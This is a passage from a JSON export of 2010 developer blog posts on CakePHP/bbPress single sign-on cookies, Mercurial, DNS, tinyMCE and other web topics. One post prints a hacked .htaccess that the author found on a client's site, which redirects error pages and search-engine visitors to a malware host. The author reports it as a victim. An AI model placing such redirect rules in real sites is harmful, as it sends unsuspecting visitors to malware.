  "text": "<p>We're almost done. There is just one last thing we must do. We don't want our dear user to have to login twice, once for the main app and once for the form, do we ?</p>\n<h4>Creating the Configure keys</h4>\n<p>So first, go back to your <code>bb-config.php</code> file and if you haven't already, define the <code>BB_AUTH_KEY</code> and <code>BB_LOGGED_IN_KEY</code>.</p>\n<p>Go to your <code>app/config/bootstrap.php</code> and create entries in <code>Configure </code>for this same keys. I named mine <code>bbPress.authKey</code> and <code>bbPress.logKey</code>.</p>\n<p>Now, go back to your database, open the <code>bb_meta</code> table and find the <code>bb_auth_salt</code> and <code>bb_loggued_in_salt</code> values. Copy them to two more <code>Configure </code>keys (<code>bbPress.authSalt</code> and <code>bbPress.logSalt</code>).</p>\n<p>One last key to create. Head back to <code>bb-config.php</code> and add the following line :</p>\n<pre lang=\"php\"><code lang=\"php\">define('BB_HASH', 'XXXXX');</code></pre>\n<p>Of course, set <code>XXXX</code> to a unique string. The name of your website should suffice, it is just used to differenciate between cookies on the same domain. Report the same value in <code>Configure</code> : <code>bbPress.hash</code>.</p>\n<h4>Creating the cookies</h4>\n<p>You're now ready to create bbPress cookies. bbPress will need to create two different sets of cookie.</p>\n<p>A bbPress cookie contain a value formatted like : <code>&lt;login&gt;|&lt;expiration&gt;|&lt;hash&gt;</code></p>\n<p>The hash is based on the user password, login, expiration and several other keys. It also involve double hashing of the value, with different salt and key values.</p>\n<p>I've eased the pain of understanding how to create a cookie value, just use the following function :</p>\n<pre lang=\"php\"><code lang=\"php\">function __getCookieValue($options = array()) {<br />\t // We will need the login, pass and expiration date to create the cookie<br />\t $userLogin = $options['name']; // The user login<br />\t $userPass = $options['password']; // The password encrypted in the database<br />\t $userPassFragment = substr($userPass, 8, 4);    // We will take only a small part of the password<br />\t $expiration = $options['expiration'];<br />\t $data = $userLogin.$userPassFragment.\"|\".$expiration;    // The main data that will be used create the final hash<br /><br />\t // We first get a first hash key that we will use to generate a second one<br />\t $firstKey = hash_hmac('md5', $data, $options['salt']);<br />\t // Then we create the final hash saved in the cookie<br />\t $finalHash = hash_hmac('md5', $userLogin.'|'.$expiration, $firstKey);<br /><br />\t // The final data to store in the cookie<br />\t return $userLogin.\"|\".$expiration.\"|\".$finalHash;<br /><br /> }<br /></code></pre>\n<p>You should pass to this function an array containing a name, password and expiration date. The password should be exactly as it is stored in the database.</p>\n<p>You should also pass a 4th value, named salt, that is different depending of the type of cookie you're trying to create. For a auth cookie, use <code>Configure::read('bbPress.authKey').Configure::read('bbPress.authSalt')</code> and for a log cookie, use <code>Configure::read('bbPress.logKey').Configure::read('bbPress.logSalt')</code>.</p>\n<p>You will need to create two log cookies (for <code>/</code> and <code>/forum/</code>) and three auth cookies (for <code>/forum/bb-admin</code>,<code> /forum/bb-plugins</code> and <code>/forum/my-plugins</code>).</p>\n<p>Here is the complete method for creating all these cookies. Just call it in your app whenever your want to log the current user to the forum. Just feed it a user and password.</p>\n<pre lang=\"php\"><code lang=\"php\">/**<br /> *    createCookies<br /> *    Create the cookies that can be used to connect to the bbPress forum<br /> *    bbPress does a lot of complicating stuff with hashing when creating its cookie. We replicate it here<br /> *<br /> *    The content of the cookie is formed in the format username|expirationDate|hash<br /> *<br /> *    The hash part is the most difficult, it involve double hashing based on various salt and values<br /> **/<br /> function createCookies($name, $pass) {<br />\t $expirationDate = time() + 1209600; // When the cookie should stop working (2 weeks)<br /><br />\t // Getting the log in salt<br />\t $completeSalt = Configure::read('bbPress.logKey').Configure::read('bbPress.logSalt');<br />\t // The log in cookie name<br />\t $cookieName = \"bbpress_logged_in_\".Configure::read('bbPress.hash');<br />\t // Getting the value<br />\t $cookieValue = __getCookieValue(array(<br />\t\t 'name' =&gt; $name,<br />\t\t 'password' =&gt; $pass,<br />\t\t 'salt' =&gt; $completeSalt,<br />\t\t 'expiration' =&gt; $expirationDate<br />\t ));<br />\t // Setting the cookie for the correct path<br />\t setcookie($cookieName, $cookieValue, $expirationDate, \"/\", false, false, true);<br />\t setcookie($cookieName, $cookieValue, $expirationDate, \"/forum/\", false, false, true);<br /><br /><br /><br />\t // Getting the auth salt<br />\t $completeSalt = Configure::read('bbPress.authKey').Configure::read('bbPress.authSalt');<br />\t // The auth cookie name<br />\t $cookieName = \"bbpress_\".Configure::read('bbPress.hash');<br />\t // Getting the value<br />\t $cookieValue = __getCookieValue(array(<br />\t\t 'name' =&gt; $name,<br />\t\t 'password' =&gt; $pass,<br />\t\t 'salt' =&gt; $completeSalt,<br />\t\t 'expiration' =&gt; $expirationDate<br />\t ));<br />\t // Setting the cookie for the correct path<br />\t setcookie($cookieName, $cookieValue, $expirationDate, '/forum/bb-admin', false, false, true);<br />\t setcookie($cookieName, $cookieValue, $expirationDate, '/forum/bb-plugins', false, false, true);<br />\t setcookie($cookieName, $cookieValue, $expirationDate, '/forum/my-plugins', false, false, true);<br /> }</code></pre>\n<p>And for logging out, just delete the cookies :</p>\n<pre lang=\"php\"><code lang=\"php\">function clearCookies() {<br />\t // The name of the cookie to delete<br />\t $cookieName = \"bbpress_logged_in_\".Configure::read('bbPress.hash');<br />\t setcookie($cookieName, \"\", time()-3600, \"/\", false, false, true);<br />\t setcookie($cookieName, \"\", time()-3600, \"/forum/\", false, false, true);<br />\t // The auth cookie name<br />\t $cookieName = \"bbpress_\".Configure::read('bbPress.hash');<br />\t setcookie($cookieName, \"\", time()-3600, '/forum/bb-admin', false, false, true);<br />\t setcookie($cookieName, \"\", time()-3600, '/forum/bb-plugins', false, false, true);<br />\t setcookie($cookieName, \"\", time()-3600, '/forum/my-plugins', false, false, true);<br /> }</code></pre>\n<p>Hope all that helps ! It took some time to put all this together but I hope it could help other bakers out there.</p>\n<h4>Downloading</h4>\n<p>For anyone interested, here is a link to download all the files : http://www.pixelastic.com/download/bbpress.rar</p>\n<p>Note that it can't be used as-is because it involves a bbPress install, a custom Authentication system and also because I wrote it as part of a bigger plugin.</p>\n<p>So, feel free to browse the files and get what you need, but consider it as a part of a bigger app, so you'll have to re-plug what's missing.</p>",
  "publish_start": "2010-02-17 18:16:00",
  "slug": "integration-bbpress-forum-cakephp-application-part-4"
}, {
  "id": 50,
  "name": ".htaccess hacked",
  "text": "<p>Today a client called me telling me that its website was unavailable, or more exactly that the full content of the FTP was displayed instead of its homepage.</p>\n<p>After a little investigation it appears that the .htaccess file had been modified, here was the content I found :</p>\n<pre>RewriteEngine On<br />ErrorDocument 400 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 401 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 403 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 404 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />ErrorDocument 500 http://217.23.5.232/hitin.php?land=20&amp;affid=20116<br />RewriteCond %{HTTP_REFERER} .*google.* [OR]<br />RewriteCond %{HTTP_REFERER} .*ask.* [OR]<br />RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]<br />RewriteCond %{HTTP_REFERER} .*excite.* [OR]<br />RewriteCond %{HTTP_REFERER} .*altavista.* [OR]<br />RewriteCond %{HTTP_REFERER} .*msn.* [OR]<br />RewriteCond %{HTTP_REFERER} .*netscape.* [OR]<br />RewriteCond %{HTTP_REFERER} .*aol.* [OR]<br />RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]<br />RewriteCond %{HTTP_REFERER} .*goto.* [OR]<br />RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]<br />RewriteCond %{HTTP_REFERER} .*mamma.* [OR]<br />RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]<br />RewriteCond %{HTTP_REFERER} .*lycos.* [OR]<br />RewriteCond %{HTTP_REFERER} .*search.* [OR]<br />RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]<br />RewriteCond %{HTTP_REFERER} .*bing.* [OR]<br />RewriteCond %{HTTP_REFERER} .*dogpile.*<br />RewriteRule ^(.*)$ http://217.23.5.232/hitin.php?land=20&amp;affid=20116 [R=301,L]</pre>\n<p>A little search online told me that this IP refer to a malware website launching a fake Antivirus software installation.</p>\n<p>I have no idea how the .htaccess got modified, but I changed the FTP password.</p>",
  "publish_start": "2010-03-03 11:47:33",
  "slug": "htaccess-hacked"
}, {
  "id": 51,
  "name": "Using nested subrepos with Mercurial and TortoiseHg",
  "text": "<p>Nowadays, when I'm developping a new website, I almost always ended using parts and bits of the previous website I've done. All my websites are based on the same framework (cakePHP) that I have itself updated with its own CMS (Caracole, more on that later).</p>\n<p>Caracole is made of several little plugins, each one of them focusing on a simple task (like handling 404 errors, adding a recycle bin, draftable elements, SEO-friendly url, and so on).</p>\n<p>I've also updated each one of this plugins to BitBucket, allowing me to easily commit changes and clone new version from one project to another.</p>\n<p>But very often, when working on a specific project, using a specific plugin I think that I can update the plugin (be it either by adding a new feature or fixing a bug I've discovered). In that case, I want my changes to be added to both the plugin (on BitBucket) and the project I'm working on at the moment.</p>\n<p>To do that, I had to struggle my way with Mercurial because nested repositories (called subrepos) is not a trivial setup.</p>\n<h4>Setting up subrepo with Mercurial :</h4>\n<p>Let me show you the classical and easy way to achieve that :</p>\n<p>First, let's say you have your main repo. You go in the directory where you want to add your subrepo and you either create it using hg init or hg clone.</p>\n<p>You then go back to your main repo root and edit the .hgsub file (if you don't have this file yet, just create it). Add the following line to the .hgsub :</p>\n<pre lang=\"robots\">path/to/your/subrepo = path/to/your/subrepo</pre>\n<p>Now, on every subsequent commit Hg will be aware that your repo is holding a new subrepo. If you omit this line, Hg will not allow you to commit complaining about a repo inside an other repo.</p>\n<p>You can now safely commit your main repo, or your subrepo independently.</p>\n<p>Now, let's see the edge case.</p>\n<h4>Changing a classical sub directory into a subrepo</h4>\n<p>The classical example above is what you can find in the Mercurial help pages. It wasn't that helpful for me because my setup was a little different and it was causing Hg a lot of trouble.</p>\n<p>I was not creating a new subrepo, nor cloning a new one. I had sub diretcory of my main app, that I wanted to change into a subrepo. My sub directory was named 'myplugin' and I had a repo of that name hosted on BitBucket.</p>\n<p>So I tried to delete my existing 'myplugin' directory, and clone the 'myplugin' from BitBucket, edit the .hgsub and commit but Hg aborted the operation, complaining about the repo in repo file structure.</p>\n<p>After a lot of testing, and <a href=\"http://stackoverflow.com/questions/2371330/what-is-the-correct-way-to-handle-nested-hg-repositories-with-mercurial-tortoiseh\">cry for help</a>, I finally managed to get it to work. The workflow is almost the same, with one little new step.</p>\n<p>Deleting the 'myplugin' folder wasn't enough. I had to tell Mercurial to completly remove this files from its index. Using TortoiseHg, I was able to do that by right clicking on the folder, and then choosing 'TortoiseHg &gt; Remove Files'. Then I had to commit those changes, officially telling Mercurial to forget this files, and putting it in a state where those files aren't there at all.</p>\n<p>Then only was I able to clone my repo from BitBucket, edit the .hgsub file and commit my main repo.</p>",
  "publish_start": "2010-03-05 13:28:18",
  "slug": "using-nested-subrepos-with-mercurial-and-tortoisehg"
}, {
  "id": 52,
  "name": "Final Fantasy XII : La faute de frappe...",
  "text": "<p>Je suis tombé dessus par hasard, en quatrième de couverture d'un magazine, une pub pour FFXIII avec une belle faute de frappe imprimée à des millions d'exemplaires...</p>\n<p>\"Aurez-vous le courage d'affonter votre destin ?\"</p>\n<p>Affonter, oui, oui, affonter, ce qui signifie aiguiser des couteaux...</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/03/08/4b953b03b87e7-medium.jpg\" alt=\"FFXII : Aurez-vous le courage d'affonter votre des\" width=\"290\" height=\"400\" /></p>",
  "publish_start": "2010-03-08 19:03:16",
  "slug": "final-fantasy-xii-la-faute-de-frappe"
}, {
  "id": 53,
  "name": "Why is my disk full ?",
  "text": "<p>Ok, so remember when I was writing about that client of mine who had trouble with its SquirelMail implementation. I thought it was a problem of SquirelMail having trouble dealing with large directories.</p>\n<p>It was not exactly that, it more was a question of the IMAP server having issues with disk space. I made some backups of the mails, cleaned it up a little then everything went fine.</p>\n<p>But suddenly today, the same SquirrelMail started acting funny, blocking some login attempt telling me that the IMAP server stopped responding, or displaying message list without subject nor owner.</p>\n<p>Tired all of this, I decided (my client) to move its whole mail system to GMail, using the Google system, while keeping my clients domain name. To finish the registration process at Gmail, I had to put a googlehostedservice.html file online on the domain to prove that I am the owner and...</p>\n<pre lang=\"robots\">452 Transfer aborted.  No space left on device</pre>\n<p>Here is what the FTP server answered. What ? No more space ? But, but, but, but I just cleaned it all, deleting a whole 1Go log file. Wtf ?</p>\n<p>I connect to the server and got the list of the biggest files and directories by doing a :</p>\n<pre lang=\"robots\">find  /var -type f -ls | sort -k 7 -r -n | head -10</pre>\n<p>I found that the maillog was 1.1Go... I deleted it and hurry the Gmail activation process. Problem solved.</p>",
  "publish_start": "2010-03-08 19:04:50",
  "slug": "why-is-my-disk-full"
}, {
  "id": 54,
  "name": "Quick overview of the Prestashop admin panel",
  "text": "<p>One of my client wants to move an old osCommerce site to a new platform. osCommerce is really an old system, it does not handle plugins (you have to hack the core to add functionnality), has tablefull implementation and all the html and php code is mixed up.</p>\n<p>I decided to move it to Prestashop. Why Prestashop ? Well, obviously because there is not that much choice on the e-commerce open source website scene nowadays. The only other choice would have been Magento and from what I heard it is quite a pain to install and make it running.</p>\n<p>For this project, I need to act very quickly and the new website should be up and running in a matter of weeks. I'll use either a free theme or buy one online, but I won't have time to involve a full design process in this. I'll also have to migrate the complete product, customer and image database from one system to the other.</p>\n<p>That won't be an easy task but... well... I have to do it.</p>\n<p>Anyway, before starting this whole progress I wanted to see what Prestashop really had to offer me. I read their full feature list and hell, I even went to there open presentation, here in Paris, when the v1.0 was realeased but from what I've seen it was a lot of talk, a lot of features a lot of everything but very little attention to the details.</p>\n<p>Well, after testing the demo admin panel a little bit I can say that my first impression was correct. Prestashop seems to be able to do a lot of stuff, really. But the way it is presented to the user is far from optimal. There are a lot of little mistakes that make using the interface more difficult that it should be.</p>\n<p>For example they are using icons to illustrate almost any action or link. But sometimes the icons do not have ANY link to the action. The icon for the \"tags\" section is a dark cloud, the icon for the search engines is a key is an arrow, they use the same icons for very different actions (editing a tab and paying with cheque). An icon is supposed to convey in a rapid and easy visual way what is text is about, but for Prestashop it is more like \"What is that supposed to mean ?\"</p>\n<p>SEO-friendly url are achieved through the use of .htaccess. Normal would you think ? Well yep, usually. But Prestashop does that by generating a huge .htaccess (one line for each product) and mapping each product individually. I'm not really sure, and haven't run benchmarks on this but I guess it forces the server to parse the .htaccess file for each request and redirect to the correct page. It smells like a huge performance bottleneck for me, especially with a website using i18n and multiples urls.</p>\n<p>I would have saved the \"slug\" of each product (in multiple languages if needed) in the database and accessed products only based on their id. Of course, I would have hooked every methods that is supposed to write an html link or any url to a special method that would create the correct url based on the id, slug and language.</p>\n<p>They also use a default implementation of tinyMCE with a lot of useless options (like layers, html table, etc). They also have kept the default \"insert image\" implementation, asking for the image url instead of hooking a custom image upload script, much more useful.</p>\n<p>I'll have to use that admin panel anyway. I just hop that I do not underestimate the time needed to move the shop to this platform.</p>",
  "publish_start": "2010-03-08 20:36:07",
  "slug": "quick-overview-of-the-prestashop-admin-panel"
}, {
  "id": 55,
  "name": "Unresponding jQuery UI dialog box",
  "text": "<p>As this is the second time I encounter this \"issue\", I think it may be clever to post it here. At least, I won't have to debug it all the down again next time.</p>\n<p>In a nutshell, I was working on a complex UI that involve several layers of dialog boxes, each one on top of the previous one. Each new dialog box is supposed to offer the user something to do, and once it is done, the dialog box disapear and the user can get back to the previous one.</p>\n<p>The \"issues\" I was having was after closing a specific window, I wasn't able to focus the previous one. I mean, the window was there, I was even able to update its fields using jQuery, but I couldn't focus it either using keyboard or mouse.</p>\n<p>After some digging, it appears that I wasn't correctly \"closing\" the previous window. I was actually doing a <code>.dialog('destroy')</code> instead of a <code>.dialog('close')</code> and this was causing my issue.</p>\n<p>Calling <code>close </code>hides the dialog box, but keep it in the DOM. That way if I ever need the same dialog box again, jQuery is smart enough to re-use it.</p>\n<p>Calling <code>destroy </code>on the other hand actually remove the dialog box from the DOM, forcing jQuery to recreate it from scrath.</p>\n<p>It appears that calling <code>destroy </code>in my case caused a strange lose of focus, so I reverted to close instead.</p>",
  "publish_start": "2010-03-10 16:34:04",
  "slug": "unresponding-jquery-ui-dialog-box"
}, {
  "id": 56,
  "name": "Setting content-type in link attributes",
  "text": "<p>Reading a <a href=\"http://forum.alsacreations.com/topic-9-47144-3-Debat--URL-Rewriting-avec-ou-sans-ID-.html#p332138\">comment on Alsacréations</a>, I've discovered that there is a <a href=\"http://www.w3.org/TR/html401/struct/links.html#adef-type-A\">type attribute</a> defined in the link section of the HTML 4.01 spec.</p>\n<p>In a nutshell, it's an optional attribute that one can add to a &lt;a&gt; tag to tell the browser the content type it is supposed to receive if following the link.</p>\n<p>Unfortunatly, no browser seems to be using it, but I added this support to Caracole anyway.</p>",
  "publish_start": "2010-03-11 10:49:18",
  "slug": "setting-content-type-in-link-attributes"
}, {
  "id": 57,
  "name": "tinyMCE mceRemoveNode explained",
  "text": "<p>When writing my image plugin for tinyMCE today I came accross the <code>mceRemoveNode </code>command that one can use to alter the tinyMCE editor content.</p>\n<p>It has to be used with <code>editor.execCommand('mceRemoveNode', true/false, node)</code>.</p>\n<p>I don't really get what the <code>true</code>/<code>false </code>argument was about, setting either one or the other didn't change anything (that I could tell) in my case. The node argument is the DOM node you want to remove from the editor.</p>\n<p>At first I thought that the command would allow me to remove a node from the editor area. I needed it in my plugin. But it was not exactly what it really does.</p>\n<p>In fact it only removes the wrapping node, but keep the content intact. In other words if you have</p>\n<pre lang=\"html\"><code lang=\"html\">&lt;a href=\"http://www.domain.com/\"&gt;&lt;img src=\"http://www.domain.com/picture.jpg\" /&gt;&lt;/a&gt;</code></pre>\n<p>And you remove the <code>&lt;a&gt;</code> node using <code>mceRemoveNode</code>, you'll end up with</p>\n<pre lang=\"html\"><code lang=\"html\">&lt;img src=\"http://www.domain.com/picture.jpg\" /&gt;</code></pre>\n<p>in place of your link.</p>\n<p>I had to manually (well, with the great help of jQuery) remove the content of the link before removing it. I could have remove the node itself using jQuery but I thought that sticking to the tinyMCE methods would be a better approach, I don't want to mess all this stuff up, maybe \"simply\" removing html nodes like this could interfere with the <code>textarea </code>value update, I don't know. And in doubt, I prefer to use the methods and command exposed by the API</p>",
  "publish_start": "2010-03-11 20:34:47",
  "slug": "tinymce-mceremovenode-explained"
}, {
  "id": 59,
  "name": "Manually changing MX and CNAME resolving for Gmail",
  "text": "<p>I don't usually change MX resolving, but when I do, it always almost is using my registrar or host admin panel.</p>\n<p>When I have to manually do it, (because the website is hosted on a dedicated server where I have to manually edit almost everything), I always waste a lot of time understanding where to find the configuration files.</p>\n<p>Today I had to change the MX record of an existing website to use those of Google. The server hosting the website was also defined as nameserver, so I had to update the <code>/var/named/domain.tld.hosts</code> file (the file may not be in the same directory in your own server).</p>\n<p>I remove the line relative to the MX records and added those instead</p>\n<pre lang=\"htaccess\"><code lang=\"apache\">domain.tld.    IN    MX    10 ASPMX.L.GOOGLE.COM.<br />domain.tld.    IN    MX    20 ALT1.ASPMX.L.GOOGLE.COM.<br />domain.tld.    IN    MX    20 ALT2.ASPMX.L.GOOGLE.COM.<br />domain.tld.    IN    MX    30 ASPMX2.L.GOOGLE.COM.<br />domain.tld.    IN    MX    30 ASPMX3.L.GOOGLE.COM.<br />domain.tld.    IN    MX    30 ASPMX4.L.GOOGLE.COM.<br />domain.tld.    IN    MX    30 ASPMX5.L.GOOGLE.COM.</code></pre>\n<p>It worked well.</p>\n<p>I also wanted to use a simple address for the webmail, like mail.domain.tld.</p>\n<p>So I added the following line</p>\n<pre lang=\"htaccess\"><code lang=\"apache\">mail.domain.tld    IN    CNAME    ghs.google.com.</code></pre>\n<p>I also updated the serial at the start of the file and rebooted my server. I know there must be a less savage way that rebooting the server but I still haven't find it.</p>\n<p>P.S : I used this <a href=\"http://www.google.com/support/a/bin/answer.py?hl=en&amp;answer=116393\">google / DNS Stuff page</a> to help me test my records all along the way</p>",
  "publish_start": "2010-03-18 15:01:38",
  "slug": "manually-changing-mx-resolving"
}, {
  "id": 60,
  "name": "Extra GET request when using SWFUpload",
  "text": "<p>I've been using <a href=\"http://swfupload.org/\">SWFUpload </a>for quite a long time now. Put simply, it's a Flash/Javascript plugin allowing a file upload to be done without having to submit the page.</p>\n<p>Basically it uses the streaming upload capacity of flash to fire javascript events to tell the developer the upload percentage, do some filesize and filetype checks, etc.</p>\n<p>If you've ever seen an upload progress bar on any website, it most surely was done using SWFUpload.</p>\n<p>Anyway, today I spotted a strange behavior in one of my pages, heavily using <code>SWFUpload </code>(more or less 20 upload fields). Using the Net panel of Firebug, I saw some strange GET requests being made to my website.</p>\n<p>After digging into my code, I could isolate the problem. I was coming from <code>SWFUpload </code>itself. I even found record of <a href=\"http://code.google.com/p/swfupload/issues/detail?id=202\">a bug report</a> mentionning it.</p>\n<p>In a nutshell, SWFUpload always make a request to the url specified in the <code>button_image_url</code> parameter, even if you haven't specified one (in this case it made a request to your webroot).</p>\n<p>I'm not using any image for my button, or should I say, I take care of that in CSS already, my SWFUpload button is just an invisible Flash element, positionned on top of my existing button.</p>\n<p>I tried setting the value to <code>null</code>, <code>false </code>or an empty string, but it would continue to do the request.</p>\n<p>Anyway, I upgraded to the latest version (2.5.0 Beta 3), and it solves my problem. Now I'm just hoping that all the retro-compatibility will be kept.</p>",
  "publish_start": "2010-03-25 19:02:42",
  "slug": "extra-get-request-when-using-swfupload"
}, {
  "id": 61,
  "name": "Viddler utf8 encoding issue with video description",
  "text": "<p>It seems that Viddler changed something on their video API in the middle of January, and it broke <code>utf8 </code>support.</p>\n<p>All the videos I've uploaded to their service from October 2009 until January 10th 2010 are working correctly.</p>\n<p>But for every video uploaded after that (in fact, from January 24th as far as I can tell), the description text gets corrupted. All the special characters (like é or €) gets replaced by their un-encoded counterparts (like Ã©).</p>\n<p>It happens either when using their API from a distant server or using their homemade simple uploader.</p>\n<p>Even \"worse\", when retrieving the video details from their API the description field gets \"htmlspecialchared\" and I end up dealing with &amp;Atilde;&amp;copy;</p>\n<p>Anyway, I send them an email about that. I've had to contact Viddler support in the past and they are quite responsive, so I'm sure they will correct this in no time, seing how trivial it is (in fact, the title field is not affected by this bug).</p>\n<p>Update 29th March : Viddler support filed a ticket for the issue.</p>",
  "publish_start": "2010-03-25 20:45:08",
  "slug": "viddler-utf8-encoding-issue-with-video-description"
}, {
  "id": 63,
  "name": "Mysql auto backup",
  "text": "<p>I'm in the process of automating the backup of all the mysql databases of my clients' website. We never know what can happen, so having a backup of all this data is really really important.</p>\n<p>MySQL data contains all the data added by the user, it means that unless you make regular backup of this data, you can't regenerate it.</p>\n<p>I have multiple clients, with several websites each and an equivalent number of databases. I wanted to store a backup of all those on my local drive, to prevent any server crash problem.</p>\n<p>I wanted a daily backup, and as my working station is on Windows XP I tried to find a simple software to do just that.</p>\n<p>There is a little tool called mysqldump on linux that does just that : saving an entire database in a single file. Joined with some cron job and rotating the files it shouldn't be hard to implement.</p>\n<p>But finding a software to do that on Windows is just terrible. I've been searching for them for more that 2 hours now and everything I find is horrible.</p>\n<p>At first I found <a href=\"http://www.swordsky.com/\">AutoBackup for Mysql</a> but the software is written in something that even myself can't call English (and I know that my prose is not exactly Shakespeare). I had to click on some options to guess what it was supposed to do... I guess after some practice and once the tasks are scheduled it doesn't matter anymore but the trial version can't save more that 50 records per table and the price of the full version (~100$) is by far too expensive.</p>\n<p>By continuing my quest, I ended up downloading this same software under different names.</p>\n<p>Then I found <a href=\"http://www.richtsoft.com/mod.php?theme=richtsoft&amp;theme=richtsoft&amp;mod=webpage&amp;op=view&amp;wid=18\">DumpTimer</a> and its brownish interface. It is also a great example of ergonomic errors : window too small forcing to scroll to reveal the options, nonsense message boxes popping, large amount of typo errors, limited choice of options.</p>\n<p>But it does the job, in a very basic form, but it does it right. I could save my list of servers, check which databases and tables to save (well, all of them) and choose where to save them. There also was an option to copy them to another database, but I didn't tried that.</p>\n<p>One of the main caveats was that it could only save the most recent backup, there was no way to save, say, the last 30 days.</p>",
  "publish_start": "2010-03-29 18:31:59",
  "slug": "mysql-auto-backup"
}, {
  "id": 64,
  "name": "Generating salt values",
  "text": "<p>Wordpress made available a nice tool to generate fairly complicated strings, perfectly usable as salt value for all your password hashing process.</p>\n<p>As I'm often heading to this page to generate new ones on new projects I thougt I may share the link with you :</p>\n<p>https://api.wordpress.org/secret-key/1.1/bbpress/</p>",
  "publish_start": "2010-03-31 18:59:03",
  "slug": "generating-salt-values"
}, {
  "id": 65,
  "name": "cakePHP i18n extract and plugins",
  "text": "<p>Cake has a lot of wonderful tools in its console. One of them is the <code>i18n extract</code> task that reads every file of your app, and extract strings that should be translated (used with <code>__()</code>, <code>__d()</code>, etc).</p>\n<p>With cake 1.3 RC3 it even stored each domain string in its own <code>.pot</code> file.</p>\n<p>But, as far as I know (I've posted on the google group about that, maybe someone will show me where I'm wrong), the console task is limited when dealing with plugins.</p>\n<p>Let's say I have a plugin in my app. I'm using <code>__d('plugin_name', 'My plugin string')</code> in my plugin and <code>__('My app string')</code> in the main app.</p>\n<p>If I run the <code>cake i18n extract</code> in my plugin directory, it will correctly generate the <code>.pot </code>file in my plugin <code>locale/</code> folder.</p>\n<p>But if I run it in the main app, it will scan every plugin file and thus finding any plugin string and save them in the <code>default.pot</code> or in its own <code>plugin_name.pot</code> file (depending on the value of the merge option).</p>\n<p>I don't need the <code>plugin_name.pot</code> files in <code>app/locale</code>, I already have them in <code>app/plugins/plugin_name/locale</code>. I know it's no big deal, I just have to delete the useless files created every time I run the <code>cake i18n extract</code> on the main app but it is kind of irritating.</p>\n<p>So I updated the <code>cake/console/libs/tasks</code> to add a new option to the task, named '<code>plugins</code>' (value : yes/no. Default to no).</p>\n<p>If set to no, the extract task will skip every plugin directory when extracting files. This way, I have no more clutter, it only extract string that are in the app.</p>\n<p>All I had to do was updating the <code>execute()</code> method, and replacing the end of the method (from line 152) with this one :</p>\n<pre lang=\"php\"><code lang=\"php\">$this-&gt;params['plugins'] = isset($this-&gt;params['plugins']) ? $this-&gt;params['plugins'] : 'no';<br />if (empty($this-&gt;__files)) {<br />\tif ($this-&gt;params['plugins']=='yes') {<br />\t\t$this-&gt;__searchFiles();<br />\t} else {<br />\t\t$this-&gt;__searchFilesExcludePlugins();<br />\t}<br />}</code></pre>\n<p>And then add this method to the class :</p>\n<pre lang=\"php\"><code lang=\"php\">function __searchFilesExcludePlugins() {<br />\tforeach ($this-&gt;__paths as $path) {<br />\t\t$Folder = new Folder($path);<br />\t\t$filelist = $Folder-&gt;tree($path);<br />\t\tforeach($filelist[1] as &amp;$file) {<br />\t\t\t// We discard plugins<br />\t\t\tif (strpos(str_replace($path, '', $file), DS.'plugins')===0) continue;<br />\t\t\t// We keep those that match the pattern<br />\t\t\tif (!preg_match('/^.*\\.(php|ctp|thtml|inc|tpl)$/i', $file)) continue;<br />\t\t\t$this-&gt;__files[]= $file;<br />\t\t}<br />\t}<br />}<br /></code></pre>",
  "publish_start": "2010-04-02 16:35:23",
  "slug": "cakephp-i18n-extract-and-plugins"
}, {
  "id": 66,
  "name": "-webkit-box-shadow inset value",
  "text": "<p>Webkit browsers (Safari and Chrome) have the <code>-webkit-box-shadow</code> property defined to add shadows to elements. Shadow can either be outside the box, or inside it (using the inset parameter).</p>\n<p>Unfortunatly, only the latest Webkit nightlies have the <code>inset</code> parameter functionnal, Safari 4 does not.</p>\n<p>Chrome does indeed have the inset parameter, but it also have <a href=\"http://code.google.com/p/chromium/issues/detail?id=25334\">a bug</a> when used in conjunction with the <code>-webkit-border-radius</code> property : the inset shadow is visible \"behind\" the element where the borders are rounded.</p>\n<p>This bug does not occur on Mac, but as I have no way to target a certain OS when writing CSS rules, I decided to remove <code>inset box-shadow</code> for webkit browsers on my actual projects, I may re-insert them later when both issues will be fixed.</p>",
  "publish_start": "2010-04-03 16:50:14",
  "slug": "webkit-box-shadow-inset-value"
}, {
  "id": 67,
  "name": "Updated CSSTidy files",
  "text": "<p>CSSTidy allows you to optimize your CSS files by aggregating them in one unique file, removing useless spaces and comments as well as running some other optimizations on multiple declarations and shorthand notations.</p>\n<p>But if, like me, you're still using the 1.3 version available on the official website, you may have run into issues when dealing with the latest CSS3 goodies.</p>\n<p>I've been hacking this library in the last year, adding support for <code>@font-face</code> and for proprietary prefixed properties values, but today I was faced with some other issues that I wasn't able to resolve.</p>\n<p>CSSTidy does not use regexp to parse the file, it reads it one char at a time and does its optimization at the same time, and it is sometimes quite hard to follow.</p>\n<p>Anyway, I just discovered that the Sourceforge page of the project is still up and running and that a commit was added today, so the project is not dead ! I also posted two bug reports and one (dummy) patch.</p>\n<p>Here's the link, you got a download link at the bottom : http://csstidy.svn.sourceforge.net/viewvc/csstidy/trunk/</p>",
  "publish_start": "2010-04-04 23:05:45",
  "slug": "updated-csstidy-files"
}, {
  "id": 68,
  "name": "CSS rule to target only Firefox",
  "text": "<p>I just found (via <a href=\"http://enure.net/post/article/serve-css-to-only-firefox\">enure.net</a>) a CSS rule using proprietary Mozilla filter that would allow one to specifically target Mozilla.</p>\n<p>I'm not a huge fan of CSS hacks like that, I usually restrain them to the bare minimum of IE conditional comments. But in some edge cases, it is sometimes useful, if you really don't have other options.</p>\n<p>I'd like to find the equivalent rules (using proprietary rules, no parser bug) for Safari, Chrome and Opera</p>\n<pre style=\"margin-bottom: 24px;\"><code lang=\"css\">@-moz-document url-prefix() { <br />\tp { color: red; }<br />}<br /></code></pre>",
  "publish_start": "2010-04-05 13:08:32",
  "slug": "firefox-only-css-rules"
}, {
  "id": 70,
  "name": "missing data in jQuery Ajax event ajaxSuccess",
